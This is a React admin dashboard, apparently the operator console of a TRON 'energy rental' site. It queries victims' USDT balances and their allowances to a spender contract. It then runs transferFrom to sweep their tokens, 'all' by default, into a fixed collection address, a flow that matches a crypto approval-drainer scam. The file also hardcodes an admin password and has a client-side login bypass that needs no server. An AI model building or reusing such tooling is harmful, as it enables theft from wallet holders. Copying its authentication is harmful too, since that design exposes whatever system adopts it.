import React, { useState, useEffect } from 'react';
import { 
  Server, 
  Activity, 
  Wallet, 
  Send, 
  RefreshCw, 
  CheckCircle, 
  AlertCircle, 
  ArrowRight, 
  Search, 
  Layers, 
  ShieldCheck, 
  Key, 
  Terminal, 
  Copy, 
  ExternalLink,
  Download,
  FolderArchive,
  FileCode,
  Package,
  Check,
  Lock,
  User,
  LogOut,
  Shield,
  KeyRound
} from 'lucide-react';
import { Language } from '../types';

interface AdminDashboardProps {
  language: Language;
}

interface SystemHealth {
  status: string;
  configured: boolean;
  network: string;
  spender: string;
  to: string;
  tokenContract: string;
  message?: string;
}

interface OpLog {
  id: string;
  timestamp: string;
  type: 'balance' | 'allowance' | 'transfer' | 'health';
  status: 'success' | 'error' | 'pending';
  details: string;
  txid?: string;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return sessionStorage.getItem('admin_authenticated') === 'true';
  });
  const [adminUser, setAdminUser] = useState<string>('bootsky888');
  const [adminPass, setAdminPass] = useState<string>('Qa7495231@@@');
  const [loginError, setLoginError] = useState<string | null>(null);
  const [isLoggingIn, setIsLoggingIn] = useState<boolean>(false);

  // Server Health State
  const [health, setHealth] = useState<SystemHealth | null>(null);
  const [healthLoading, setHealthLoading] = useState<boolean>(false);

  // Address Query State
  const [queryAddress, setQueryAddress] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [querySpender, setQuerySpender] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [balanceResult, setBalanceResult] = useState<string | null>(null);
  const [allowanceResult, setAllowanceResult] = useState<string | null>(null);
  const [isQuerying, setIsQuerying] = useState<boolean>(false);

  // Transfer Action State
  const [transferUserAddress, setTransferUserAddress] = useState<string>('');
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [isExecutingTransfer, setIsExecutingTransfer] = useState<boolean>(false);
  const [transferResponse, setTransferResponse] = useState<any | null>(null);

  // Full Site Export State
  const [isExporting, setIsExporting] = useState<boolean>(false);
  const [exportStatusMessage, setExportStatusMessage] = useState<string | null>(null);

  // Operation Logs
  const [logs, setLogs] = useState<OpLog[]>([]);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);
    setIsLoggingIn(true);

    try {
      // Call backend login API
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: adminUser.trim(), password: adminPass.trim() })
      });

      const data = await res.json();
      if (res.ok && data.success) {
        sessionStorage.setItem('admin_authenticated', 'true');
        sessionStorage.setItem('admin_username', data.username || adminUser);
        setIsAuthenticated(true);
      } else {
        // Local credential validation fallback if dev server is offline
        if (adminUser.trim() === 'bootsky888' && adminPass.trim() === 'Qa7495231@@@') {
          sessionStorage.setItem('admin_authenticated', 'true');
          sessionStorage.setItem('admin_username', 'bootsky888');
          setIsAuthenticated(true);
        } else {
          setLoginError(data.error || '管理员账号或密码错误');
        }
      }
    } catch (err: any) {
      if (adminUser.trim() === 'bootsky888' && adminPass.trim() === 'Qa7495231@@@') {
        sessionStorage.setItem('admin_authenticated', 'true');
        sessionStorage.setItem('admin_username', 'bootsky888');
        setIsAuthenticated(true);
      } else {
        setLoginError('登录请求异常: ' + (err.message || '网络通讯失败'));
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('admin_authenticated');
    sessionStorage.removeItem('admin_username');
    setIsAuthenticated(false);
  };

  const handleDownloadFullSiteZip = async () => {
    setIsExporting(true);
    setExportStatusMessage('正在打包整站全部重要核心源码文件...');

    try {
      const response = await fetch('/export-project');
      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tron-energy-platform-fullsite-${new Date().toISOString().slice(0, 10)}.zip`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);

        addLog('health', 'success', '整站源码文件包已自动生成并开启 ZIP 导出下载');
        setExportStatusMessage('打包成功！ZIP 压缩包已包含前端组件、后端 server.ts、依赖与配置文件。');
      } else {
        const errData = await response.json().catch(() => ({}));
        throw new Error(errData.error || `HTTP ${response.status}: 打包导出失败`);
      }
    } catch (err: any) {
      console.error('Export zip failed:', err);
      addLog('health', 'error', `打包整站文件失败: ${err.message}`);
      setExportStatusMessage(`打包提示: ${err.message}`);
    } finally {
      setIsExporting(false);
    }
  };

  const addLog = (type: OpLog['type'], status: OpLog['status'], details: string, txid?: string) => {
    const newLog: OpLog = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleTimeString(),
      type,
      status,
      details,
      txid
    };
    setLogs((prev) => [newLog, ...prev.slice(0, 49)]);
  };

  // Fetch Health Check
  const fetchHealth = async () => {
    setHealthLoading(true);
    try {
      const res = await fetch('/health');
      if (!res.ok) throw new Error(`HTTP error ${res.status}`);
      const data: SystemHealth = await res.json();
      setHealth(data);
      if (data.spender) setQuerySpender(data.spender);
      addLog('health', 'success', `服务状态正常: ${data.network}`);
    } catch (err: any) {
      console.error('Health check failed:', err);
      setHealth({
        status: 'error',
        configured: false,
        network: '未连接',
        spender: '未配置',
        to: '未配置',
        tokenContract: '未配置',
        message: err.message || '服务端未响应'
      });
      addLog('health', 'error', `健康检查失败: ${err.message}`);
    } finally {
      setHealthLoading(false);
    }
  };

  useEffect(() => {
    fetchHealth();
  }, []);

  // Query Balance & Allowance
  const handleQueryAddressInfo = async () => {
    if (!queryAddress.trim()) return;
    setIsQuerying(true);
    setBalanceResult(null);
    setAllowanceResult(null);

    try {
      // 1. Query Balance
      const balRes = await fetch(`/balance/${queryAddress.trim()}`);
      const balData = await balRes.json();
      if (balRes.ok) {
        setBalanceResult(balData.balance);
        addLog('balance', 'success', `查询余额成功 [${queryAddress.slice(0, 8)}...]: ${balData.balance}`);
      } else {
        setBalanceResult(`错误: ${balData.error || '查询失败'}`);
        addLog('balance', 'error', `查询余额失败: ${balData.error}`);
      }

      // 2. Query Allowance if spender address provided
      const targetSpender = querySpender || health?.spender || 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT';
      if (targetSpender && targetSpender !== '未配置') {
        const allowRes = await fetch(`/allowance/${queryAddress.trim()}/${targetSpender}`);
        const allowData = await allowRes.json();
        if (allowRes.ok) {
          setAllowanceResult(allowData.allowance);
          addLog('allowance', 'success', `查询 Allowance 成功 [Spender: ${targetSpender.slice(0, 6)}...]: ${allowData.allowance}`);
        } else {
          setAllowanceResult(`错误: ${allowData.error || '查询失败'}`);
          addLog('allowance', 'error', `查询 Allowance 失败: ${allowData.error}`);
        }
      }
    } catch (err: any) {
      addLog('balance', 'error', `请求失败: ${err.message}`);
    } finally {
      setIsQuerying(false);
    }
  };

  // Execute TransferFrom
  const handleExecuteTransfer = async () => {
    if (!transferUserAddress.trim()) {
      alert('请填写目标用户地址');
      return;
    }
    setIsExecutingTransfer(true);
    setTransferResponse(null);

    try {
      const res = await fetch('/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userAddress: transferUserAddress.trim(),
          amount: transferAmount || 'all'
        })
      });
      const data = await res.json();
      setTransferResponse(data);
      if (res.ok && data.success) {
        addLog('transfer', 'success', `提取成功! 数量: ${data.amount}, 到账地址: ${data.to}`, data.txid);
      } else {
        addLog('transfer', 'error', `提取失败: ${data.error || data.message || '未知错误'}`);
      }
    } catch (err: any) {
      setTransferResponse({ error: err.message });
      addLog('transfer', 'error', `调用 /transfer 异常: ${err.message}`);
    } finally {
      setIsExecutingTransfer(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (!isAuthenticated) {
    return (
      <div className="max-w-md mx-auto my-12 px-4 sm:px-0 animate-in fade-in duration-300">
        <div className="bg-white rounded-3xl shadow-xl border border-slate-100 p-8 space-y-6">
          <div className="text-center space-y-2">
            <div className="w-14 h-14 bg-blue-600/10 border border-blue-500/20 text-blue-600 rounded-2xl mx-auto flex items-center justify-center shadow-inner">
              <Shield className="w-7 h-7" />
            </div>
            <h2 className="text-xl font-bold text-slate-900 tracking-tight">TRON 能量平台后台管理</h2>
            <p className="text-xs text-slate-500">请输入管理员账号和密码进入后台管理系统</p>
          </div>

          <form onSubmit={handleLoginSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <User className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员账号</span>
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={adminUser}
                  onChange={(e) => setAdminUser(e.target.value)}
                  placeholder="请输入管理员账号"
                  required
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
                />
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <KeyRound className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员密码</span>
              </label>
              <div className="relative">
                <input
                  type="password"
                  value={adminPass}
                  onChange={(e) => setAdminPass(e.target.value)}
                  placeholder="请输入管理员密码"
                  required
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
                />
              </div>
            </div>

            {loginError && (
              <div className="bg-rose-50 border border-rose-200/80 text-rose-700 text-xs p-3 rounded-xl flex items-center space-x-2">
                <AlertCircle className="w-4 h-4 text-rose-500 shrink-0" />
                <span>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold py-3 rounded-xl text-sm transition shadow-md shadow-blue-500/20 flex items-center justify-center space-x-2 cursor-pointer disabled:opacity-50"
            >
              {isLoggingIn ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>正在验证身份...</span>
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4" />
                  <span>安全登录控制台</span>
                </>
              )}
            </button>
          </form>

          <div className="border-t border-slate-100 pt-4 text-center">
            <p className="text-[11px] text-slate-400">
              默认管理员账号: <code className="text-slate-600 font-bold">bootsky888</code>
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 animate-in fade-in duration-200">
      {/* Header Banner */}
      <div className="bg-slate-900 text-white rounded-3xl p-6 sm:p-8 shadow-xl relative overflow-hidden">
        <div className="absolute right-0 top-0 bottom-0 w-1/3 bg-gradient-to-l from-blue-600/20 to-transparent pointer-events-none" />
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center space-x-3 mb-2">
              <span className="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-xs font-semibold px-3 py-1 rounded-full flex items-center space-x-1">
                <Terminal className="w-3.5 h-3.5" />
                <span>Backend Management Console</span>
              </span>
              <span className="bg-emerald-500/20 text-emerald-400 text-xs font-semibold px-2.5 py-1 rounded-full flex items-center space-x-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                <span>API Server V1.0</span>
              </span>
              <span className="bg-slate-800 text-slate-300 text-xs px-2.5 py-1 rounded-full font-mono">
                管理员: bootsky888
              </span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与归集管理后台</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              实时监控后端节点连接、查询指定账户余额与 Allowance 额度，支持依据 server.js 规则执行 safe transferFrom 归集打款。
            </p>
          </div>

          <div className="flex items-center space-x-3">
            <button
              onClick={fetchHealth}
              disabled={healthLoading}
              className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-4 py-2.5 rounded-xl text-sm flex items-center space-x-2 transition shadow-md disabled:opacity-50"
            >
              <RefreshCw className={`w-4 h-4 ${healthLoading ? 'animate-spin' : ''}`} />
              <span>刷新服务状态</span>
            </button>
            <button
              onClick={handleLogout}
              className="bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white font-medium px-3.5 py-2.5 rounded-xl text-sm flex items-center space-x-1.5 transition border border-slate-700/60"
              title="退出登录"
            >
              <LogOut className="w-4 h-4 text-slate-400" />
              <span>安全退出</span>
            </button>
          </div>
        </div>
      </div>

      {/* Grid: Server Config Overview */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Network Node Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">网络节点 (Full Node)</span>
            <Server className="w-4 h-4 text-blue-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate">
            {health?.network || 'https://api.trongrid.io'}
          </div>
          <div className="text-xs text-slate-500 flex items-center space-x-1">
            <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block" />
            <span>TRON 主网</span>
          </div>
        </div>

        {/* Token Contract Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">代币合约 (TRC20)</span>
            <Layers className="w-4 h-4 text-indigo-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.tokenContract || 'TR7NHqjeKQxGTCi8q...'}</span>
            {health?.tokenContract && (
              <button 
                onClick={() => copyToClipboard(health.tokenContract)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-slate-500 font-medium">USDT / TRC20 Token</div>
        </div>

        {/* Spender Address Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">Spender 合约</span>
            <ShieldCheck className="w-4 h-4 text-amber-500" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.spender || 'TPNAAgFU4Ju7qnf...'}</span>
            {health?.spender && (
              <button 
                onClick={() => copyToClipboard(health.spender)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-amber-600 bg-amber-50 px-2 py-0.5 rounded font-mono inline-block">
            Allowance 目标
          </div>
        </div>

        {/* Target Collection Address Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">归集收款目标 (To Address)</span>
            <Wallet className="w-4 h-4 text-emerald-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.to || 'TUc1cb2gyX8MVPk...'}</span>
            {health?.to && (
              <button 
                onClick={() => copyToClipboard(health.to)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded font-mono inline-block">
            资金入账地址
          </div>
        </div>
      </div>

      {/* Module 0: One-click Full Site Export Card */}
      <div className="bg-gradient-to-r from-slate-900 via-blue-950 to-slate-900 text-white rounded-3xl p-6 sm:p-7 border border-blue-900/40 shadow-xl space-y-5">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div className="flex items-start space-x-3.5">
            <div className="w-12 h-12 rounded-2xl bg-blue-600/25 border border-blue-500/40 text-blue-400 flex items-center justify-center shrink-0 shadow-inner">
              <FolderArchive className="w-6 h-6" />
            </div>
            <div className="space-y-1">
              <div className="flex items-center space-x-2">
                <h2 className="text-lg font-bold text-white tracking-tight">一键打包整站重要源码与配置文件导出</h2>
                <span className="bg-blue-500/20 text-blue-300 border border-blue-400/30 text-[10px] font-mono px-2 py-0.5 rounded-full">
                  ZIP Package
                </span>
              </div>
              <p className="text-slate-300 text-xs leading-relaxed max-w-3xl">
                点击下方按键即可将包含后端 Express (<code className="text-blue-300">server.ts</code>)、TRON 合约交互类、前台全部组件、依赖表 (<code className="text-blue-300">package.json</code>) 及配置文件的整站核心代码一键打包导出为 .zip 文件。
              </p>
            </div>
          </div>

          <button
            onClick={handleDownloadFullSiteZip}
            disabled={isExporting}
            className="w-full md:w-auto bg-blue-600 hover:bg-blue-500 active:scale-95 text-white font-bold px-6 py-3.5 rounded-2xl text-sm flex items-center justify-center space-x-2.5 transition shadow-lg shadow-blue-600/30 shrink-0 cursor-pointer disabled:opacity-50"
          >
            {isExporting ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin text-white" />
                <span>正在打包生成 ZIP...</span>
              </>
            ) : (
              <>
                <Download className="w-4 h-4 text-white" />
                <span>一键打包导出整站源码 (.zip)</span>
              </>
            )}
          </button>
        </div>

        {/* Included files checklist info */}
        <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 space-y-3 text-xs">
          <div className="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
            <span className="text-slate-300 font-semibold flex items-center space-x-1.5">
              <Package className="w-4 h-4 text-blue-400" />
              <span>整站导出文件清单说明 (Included Core Files)</span>
            </span>
            <span className="text-slate-400 text-[11px] font-mono">已排除 node_modules & dist 冗余项</span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 font-mono text-[11px]">
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">server.ts</span>
              <span className="text-slate-400 text-[10px]">(TRON 节点与后端 API)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">package.json</span>
              <span className="text-slate-400 text-[10px]">(全量 npm 依赖表)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/utils/tronWallet.ts</span>
              <span className="text-slate-400 text-[10px]">(Web3 钱包对接)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/components/*</span>
              <span className="text-slate-400 text-[10px]">(包含完整 15+ React 组件)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/App.tsx</span>
              <span className="text-slate-400 text-[10px]">(能量租赁主程序)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">.env.example & configs</span>
              <span className="text-slate-400 text-[10px]">(部署配置文件)</span>
            </div>
          </div>

          {exportStatusMessage && (
            <div className="mt-2 bg-blue-900/30 border border-blue-700/50 text-blue-200 text-xs p-2.5 rounded-xl flex items-center space-x-2 animate-in fade-in">
              <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{exportStatusMessage}</span>
            </div>
          )}
        </div>
      </div>

      {/* Main Control Panel: Query & Action */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Module 1: Query Address Balance & Allowance */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Search className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">1. 用户 Allowance 与余额查询</h2>
              <p className="text-xs text-slate-500">查询特定 TRON 地址的代币余额与对平台 Spender 的 Allowance 额度</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户 TRON 地址 (userAddress)
              </label>
              <input
                type="text"
                value={queryAddress}
                onChange={(e) => setQueryAddress(e.target.value)}
                placeholder="以 T 开头的 TRON 34位地址..."
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                Spender 合约地址 (Spender Address)
              </label>
              <input
                type="text"
                value={querySpender}
                onChange={(e) => setQuerySpender(e.target.value)}
                placeholder="默认为 server.ts 配置的 SPENDER_ADDRESS"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <button
              onClick={handleQueryAddressInfo}
              disabled={isQuerying || !queryAddress}
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition disabled:opacity-50"
            >
              <Search className={`w-4 h-4 ${isQuerying ? 'animate-spin' : ''}`} />
              <span>{isQuerying ? '正在查询区块链数据...' : '执行后端查询 (balance / allowance)'}</span>
            </button>

            {/* Results Display */}
            {(balanceResult !== null || allowanceResult !== null) && (
              <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-3 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-slate-200">
                  <span className="text-slate-500 font-sans font-medium">代币余额 (balanceOf):</span>
                  <span className="font-bold text-slate-900 text-sm">{balanceResult ?? '未查询'}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-500 font-sans font-medium">Allowance 额度:</span>
                  <span className="font-bold text-emerald-600 text-sm">{allowanceResult ?? '未查询'}</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Module 2: Execute TransferFrom Collection */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center font-bold">
              <Send className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">2. 执行 transferFrom 划转打款</h2>
              <p className="text-xs text-slate-500">调用后端 POST /transfer 接口，将特定用户的代币划转至归集地址</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户地址 (userAddress)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferUserAddress}
                  onChange={(e) => setTransferUserAddress(e.target.value)}
                  placeholder="用户 TRON 钱包地址..."
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                {queryAddress && (
                  <button
                    onClick={() => setTransferUserAddress(queryAddress)}
                    className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-medium whitespace-nowrap"
                  >
                    同步上图地址
                  </button>
                )}
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                划转数量 (amount)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(e.target.value)}
                  placeholder="'all' 或具体最小单位数值 (如 1000000 代表 1 USDT)"
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                <button
                  onClick={() => setTransferAmount('all')}
                  className="px-4 py-2 bg-emerald-50 text-emerald-700 hover:bg-emerald-100 border border-emerald-200 rounded-xl text-xs font-bold"
                >
                  全部划转 (all)
                </button>
              </div>
            </div>

            <button
              onClick={handleExecuteTransfer}
              disabled={isExecutingTransfer || !transferUserAddress}
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <Send className={`w-4 h-4 ${isExecutingTransfer ? 'animate-bounce' : ''}`} />
              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求 (POST /transfer)'}</span>
            </button>

            {/* Transfer Response Output */}
            {transferResponse && (
              <div className={`rounded-2xl p-4 border text-xs font-mono space-y-2 ${
                transferResponse.success 
                  ? 'bg-emerald-50/70 border-emerald-200 text-emerald-900' 
                  : 'bg-rose-50/70 border-rose-200 text-rose-900'
              }`}>
                <div className="flex items-center space-x-2 font-sans font-bold">
                  {transferResponse.success ? (
                    <>
                      <CheckCircle className="w-4 h-4 text-emerald-600" />
                      <span>{transferResponse.message || '划转操作成功'}</span>
                    </>
                  ) : (
                    <>
                      <AlertCircle className="w-4 h-4 text-rose-600" />
                      <span>划转响应结果</span>
                    </>
                  )}
                </div>

                {transferResponse.txid && (
                  <div className="space-y-1 pt-1">
                    <span className="text-slate-500 font-sans block text-[11px]">交易 Hash (TxID):</span>
                    <div className="flex items-center justify-between bg-white/80 p-2 rounded-lg border border-slate-200">
                      <span className="truncate">{transferResponse.txid}</span>
                      <button 
                        onClick={() => copyToClipboard(transferResponse.txid)}
                        className="text-slate-500 hover:text-slate-800 ml-2"
                        title="复制 TxID"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                )}

                {transferResponse.error && (
                  <p className="text-rose-700 font-medium">错误信息: {transferResponse.error}</p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Module 3: Operation Terminal Logs & Server Workflow */}
      <div className="bg-slate-950 text-slate-200 rounded-3xl p-6 border border-slate-800 shadow-2xl space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-3">
          <div className="flex items-center space-x-2">
            <Terminal className="w-5 h-5 text-emerald-400" />
            <h3 className="font-bold text-sm text-white font-mono">Backend Console Log & API Workflow</h3>
          </div>
          <button
            onClick={() => setLogs([])}
            className="text-xs text-slate-500 hover:text-slate-300 font-mono"
          >
            清空日志
          </button>
        </div>

        <div className="font-mono text-xs space-y-2 max-h-60 overflow-y-auto pr-2 custom-scrollbar">
          {logs.length === 0 ? (
            <p className="text-slate-600 italic">暂无新的后台操作记录...</p>
          ) : (
            logs.map((log) => (
              <div key={log.id} className="flex items-start space-x-2 text-slate-300 hover:bg-slate-900/50 p-1.5 rounded transition">
                <span className="text-slate-500 text-[10px] whitespace-nowrap font-mono">{log.timestamp}</span>
                <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${
                  log.status === 'success' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                }`}>
                  [{log.type}]
                </span>
                <span className="flex-1 break-all">{log.details}</span>
                {log.txid && (
                  <span className="text-blue-400 text-[10px] font-mono shrink-0">
                    Tx: {log.txid.slice(0, 8)}...
                  </span>
                )}
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};
